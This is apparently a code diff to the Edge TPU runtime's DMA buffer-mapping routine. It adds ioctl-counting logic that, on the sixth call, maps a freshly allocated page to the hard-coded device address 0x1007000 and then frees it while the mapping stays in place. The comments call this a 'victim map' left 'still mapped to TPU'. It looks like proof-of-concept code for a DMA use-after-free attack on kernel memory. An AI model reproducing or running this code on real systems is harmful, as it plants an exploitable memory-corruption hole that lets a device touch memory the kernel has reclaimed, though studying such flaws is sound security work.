   buffer_to_map.flags = DirectionFlag(direction)
                         << GASKET_PT_FLAGS_DMA_DIRECTION_SHIFT;
-
+  
   int ioctl_retval = 0;
   if (map_flags_supported_) {
     ioctl_retval = ioctl(fd_, GASKET_IOCTL_MAP_BUFFER_FLAGS, &buffer_to_map);
@@ -144,6 +188,46 @@ Status KernelMmuMapper::DoMap(const void *buffer, int num_pages,
                             buffer_to_map.base.device_address, num_pages);
   }
 
+
+  VLOG(4) << StringPrintf("[Debug Sri] testing\n");
+  static int ioctl_counter = 0;
+  ioctl_counter++;
+  VLOG(4) << StringPrintf("[Debug Sri] ioctl_counter = %d\n", ioctl_counter);
+
+  if(ioctl_counter == 6){ // 6th ioctl will be a victim map, On the 6th hit, set device_va to target value
+    gasket_page_table_ioctl_flags buffer_to_map_victim;
+
+    size_t size = 4096; // 1 pages
+    void *victim_ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (victim_ptr == MAP_FAILED) {
+        VLOG(4) << StringPrintf("[Debug Sri] mmap failed");
+    }else{
+        VLOG(4) << StringPrintf("[Debug Sri] mmap success");
+    }
+    memset(victim_ptr, 0x17, 4096);
+    VLOG(4) << StringPrintf("[Debug Sri] victim_ptr = %p\n", victim_ptr);
+    
+    buffer_to_map_victim.base.page_table_index = 0;
+    buffer_to_map_victim.base.host_address = reinterpret_cast<uintptr_t>(victim_ptr);
+    buffer_to_map_victim.base.size = 4096;
+    buffer_to_map_victim.base.device_address = 0x1007000; //make it map to target device address
+    buffer_to_map_victim.flags = DirectionFlag(direction)
+                          << GASKET_PT_FLAGS_DMA_DIRECTION_SHIFT;
+
+    DoVictimMap(buffer_to_map_victim);
+
+    // Advise the OS to drop the page contents before unmapping
+    madvise(victim_ptr, size, MADV_DONTNEED);  // Mark for immediate reuse
+    
+    // Free the mapped memory, physical memory will be given back to the kernel, but the physical memory will be still mapped to TPU 
+    if (munmap(victim_ptr, size) == 0) {
+        VLOG(4) << StringPrintf("[Debug Sri] Memory unmapped successfully\n");
+    } else {
+        VLOG(4) << StringPrintf("[Debug Sri] munmap failed");
+    }
+
+
+  }
   return Status();  // OK
 }
 
